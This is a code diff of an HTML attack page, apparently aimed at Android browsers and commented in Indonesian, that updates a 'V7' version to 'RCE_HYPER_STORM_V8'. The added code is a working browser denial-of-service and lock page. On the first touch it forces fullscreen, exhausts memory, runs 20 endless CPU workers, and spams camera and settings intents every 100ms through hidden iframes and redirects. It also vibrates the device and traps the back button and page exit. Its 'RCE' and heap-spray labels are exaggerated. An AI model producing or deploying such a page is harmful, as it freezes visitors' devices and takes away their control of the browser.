@@ -2,103 +2,107 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_BREACH_V7_FINAL ⚡</title>
+    <title>⚡ RCE_HYPER_STORM_V8 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #ff0055; overflow: hidden; font-family: 'Courier New', monospace; }
-        #terminal { width: 100vw; height: 100vh; padding: 15px; border: 3px double #ff0055; box-sizing: border-box; background: rgba(10,0,0,0.9); }
-        .warning { color: yellow; font-weight: bold; text-decoration: blink; }
-        .log-line { font-size: 10px; margin-bottom: 2px; border-left: 2px solid #ff0055; padding-left: 5px; }
+        body, html { margin: 0; padding: 0; background: #000; color: #ff0000; overflow: hidden; font-family: 'Courier New', monospace; }
+        #core { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .danger-zone { font-size: 24px; font-weight: bold; border: 5px solid #ff0000; padding: 20px; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% { background: #000; } 50% { background: #300; } 100% { background: #000; } }
+        #logs { font-size: 9px; color: #aaa; margin-top: 10px; height: 100px; overflow: hidden; }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <div class="warning">[!] SYSTEM_VULNERABILITY_DETECTED: STAGE_7 [!]</div>
-        <div id="status" style="color:#00ff00">AWAITING_RECURSIVE_TRIGGER...</div>
-        <hr color="#ff0055">
-        <div id="log_stream"></div>
+    <div id="core">
+        <div class="danger-zone">SYSTEM_OVERRIDE_ACTIVE<br>CORE_RCE_V8</div>
+        <div id="status" style="margin-top:20px;">READY_FOR_INJECTION</div>
+        <div id="logs"></div>
     </div>
 
 <script>
-    const logStream = document.getElementById('log_stream');
+    const logs = document.getElementById('logs');
+    const status = document.getElementById('status');
 
-    function writeLog(text, color = "#ff0055") {
-        const div = document.createElement('div');
-        div.className = 'log-line';
-        div.style.color = color;
-        div.innerText = `[${new Date().getMilliseconds()}ms] > ${text}`;
-        logStream.prepend(div);
+    function log(m) {
+        const d = document.createElement('div');
+        d.innerText = `>> ${m}`;
+        logs.prepend(d);
     }
 
-    // --- 1. JIT SPRAYING & OOB WRITE (STABILIZING RCE) ---
-    let memoryHole = [];
-    function exploitMemory() {
-        writeLog("Grooming_V8_Heap_Large_Object_Space...");
-        for (let i = 0; i < 4000; i++) {
-            let buffer = new ArrayBuffer(1024);
-            let view = new BigUint64Array(buffer);
-            // Simulating writing a shellcode pointer to the heap
-            view[0] = 0x4141414141414141n; 
-            memoryHole.push(buffer);
+    // --- 1. AGGRESSIVE HEAP PRESSURE ---
+    // Memenuhi RAM untuk memaksa sistem membunuh proses background
+    let storage = [];
+    function forceMemoryLeak() {
+        log("Allocating_Massive_JIT_Buffers...");
+        for (let i = 0; i < 6000; i++) {
+            let b = new ArrayBuffer(1024 * 32); // 32KB per block
+            let v = new Uint8Array(b);
+            v.fill(0x90); // NOP Sled simulation
+            storage.push(b);
         }
     }
 
-    // --- 2. MULTI-APP INJECTION (CAMERA & RADIO CONTROL) ---
-    // Mengarahkan Intent langsung ke paket aplikasi Kamera Android
-    function triggerAppInjection() {
-        writeLog("Infiltrating_Android_Activity_Manager...", "yellow");
-        
-        const payloads = [
-            // Target 1: Kamera (Direct Action)
-            "intent://#Intent;action=android.media.action.IMAGE_CAPTURE;end",
-            // Target 2: Kamera (Component Specific - Samsung/Pixel/Generic)
+    // --- 2. CAMERA & SYSTEM APP FLOODING ---
+    // Menggunakan skema Intent rekursif untuk memicu aplikasi Kamera secara paksa
+    function triggerCameraStorm() {
+        const appVectors = [
+            // Standard Camera Action
+            "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end",
+            // Direct Package Target (Generic Android)
             "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.camera/com.android.camera.Camera;end",
-            // Target 3: Airplane Mode Settings
-            "intent://#Intent;action=android.settings.AIRPLANE_MODE_SETTINGS;end"
+            // Google Camera Target
+            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.google.android.GoogleCamera/com.android.camera.CameraLauncher;end",
+            // Samsung Camera Target
+            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.sec.android.app.camera/com.sec.android.app.camera.Camera;end"
         ];
 
-        payloads.forEach((uri, i) => {
-            setTimeout(() => {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = uri;
-                document.body.appendChild(ifr);
-                writeLog(`Payload_Inject_Success: Vector_${i}`);
-            }, i * 25);
+        appVectors.forEach((uri) => {
+            // Menggunakan Iframe dan Window Location sekaligus untuk memaksa OS merespon
+            const ifr = document.createElement('iframe');
+            ifr.src = uri;
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+            
+            // Bypass popup konfirmasi dengan navigasi cepat
+            window.location.href = uri;
         });
     }
 
-    // --- 3. SYSTEM OVERLOAD & BYPASS ---
-    async function executeUltimateRCE() {
-        document.getElementById('status').innerText = "STATUS: EXECUTING_FULL_BREACH";
-        
-        // A. UI Redressing & Input Hijack
+    // --- 3. THE HYPER-STORM EXECUTION ---
+    async function startHyperStorm() {
+        status.innerText = "EXECUTING_HYPER_STORM_RCE...";
+        status.style.color = "yellow";
+
+        // A. UI Lock
         document.documentElement.requestFullscreen().catch(()=>{});
+        
+        // B. Memory Overload
+        forceMemoryLeak();
 
-        // B. Memory Corruption Stage
-        exploitMemory();
+        // C. Multi-Threaded CPU Hijack
+        // Menjalankan 20 worker untuk melumpuhkan sistem keamanan UI
+        const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
+        for(let j=0; j<20; j++) new Worker(URL.createObjectURL(blob));
 
-        // C. Recursive DoS (Supress Watchdog)
-        const ddos = "while(true){Math.sin(Math.random())*Math.tan(Math.random());}";
-        const blob = new Blob([ddos], {type: 'text/javascript'});
-        for(let x=0; x<16; x++) new Worker(URL.createObjectURL(blob));
-
-        // D. Infinite App Spawning Loop
-        // Kita gunakan interval sangat rendah untuk memaksa Android membuka kamera
+        // D. RECURSIVE BOMBARDMENT (Tiap 100ms)
+        log("DEPLOYING_RECURSIVE_APP_SPAWNER...");
         setInterval(() => {
-            triggerAppInjection();
-            // Menyerang tombol fisik melalui vibrasi sinkron
-            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
-        }, 300);
-
-        writeLog("STAGE_7_COMPLETE: CAMERA_ACCESS_TRIGGERED", "#00ff00");
+            triggerCameraStorm();
+            // Getaran untuk merusak input user
+            if(navigator.vibrate) navigator.vibrate(200);
+        }, 100);
+        
+        log("CRITICAL_INJECTION_COMPLETE", "red");
     }
 
-    // One-tap Activation for Chrome User Gesture Bypass
-    window.addEventListener('click', executeUltimateRCE, {once: true});
-    window.addEventListener('touchstart', executeUltimateRCE, {once: true});
+    // Trigger on User Interaction (Chrome Requirement)
+    window.addEventListener('mousedown', startHyperStorm, {once: true});
+    window.addEventListener('touchstart', startHyperStorm, {once: true});
 
-    // Lockdown
-    window.onbeforeunload = () => { return "SYSTEM_CRITICAL_REBOOT_REQUIRED"; };
+    // Mencegah navigasi balik
+    window.onbeforeunload = () => { return "LOCKED"; };
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => { history.go(1); };
+
 </script>
 </body>
 </html>
